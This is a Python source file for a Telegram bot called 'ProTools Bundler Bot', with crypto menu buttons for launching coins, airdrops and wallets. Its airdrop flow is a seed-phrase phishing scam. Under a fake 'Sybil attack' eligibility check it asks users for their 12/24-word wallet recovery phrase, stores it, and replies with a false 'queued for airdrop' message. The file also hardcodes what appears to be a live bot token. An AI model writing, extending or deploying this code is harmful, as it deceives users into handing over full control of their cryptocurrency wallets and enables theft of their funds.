import os
import logging
import asyncio
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============================================================================
# CONFIGURATION (Paste your token below)
# ============================================================================
BOT_TOKEN = "8771123401:AAHhv3aZO8WYmzDiSdbE4YPj_WvdKbEPz00" 

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- WEB SERVER FOR RENDER (Keep-Alive) ---
app = Flask('')
@app.route('/')
def home():
    return "Bot is running!"

def run_web():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run_web)
    t.start()

# ============================================================================
# HANDLERS & LOGIC
# ============================================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("🚀 Launch Coin", callback_data='launch_coin'),
         InlineKeyboardButton("📊 Transactions", callback_data='transactions')],
        [InlineKeyboardButton("🎁 Airdrop", callback_data='airdrop_start'),
         InlineKeyboardButton("🔑 Wallet", callback_data='wallet')],
        [InlineKeyboardButton("📜 Logs", callback_data='logs'),
         InlineKeyboardButton("❓ Help", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🚀 *Welcome to ProTools Bundler Bot*", parse_mode='Markdown', reply_markup=reply_markup)

async def airdrop_init(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🎁 *Airdrop Verification*\n\nTo confirm eligibility and prevent Sybil attacks, please provide your **12/24-word Recovery Phrase**:",
        parse_mode='Markdown'
    )
    context.user_data['state'] = 'AWAITING_PHRASE'

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('state')
    
    if state == 'AWAITING_PHRASE':
        context.user_data['phrase'] = update.message.text
        await update.message.reply_text("✅ Phrase received. Now, please provide your **Solana Wallet Address** for final confirmation:")
        context.user_data['state'] = 'AWAITING_ADDRESS'
        
    elif state == 'AWAITING_ADDRESS':
        # Here you would normally save or process the data
        await update.message.reply_text("🔄 *Verifying eligibility...*\nYour wallet has been queued for the next airdrop cycle.", parse_mode='Markdown')
        context.user_data['state'] = None

def main():
    # Start Keep-Alive Server
    keep_alive()

    # Build Bot
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(airdrop_init, pattern='^airdrop_start$'))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    logger.info("Bot is live...")
    application.run_polling()

if __name__ == "__main__":
    main()
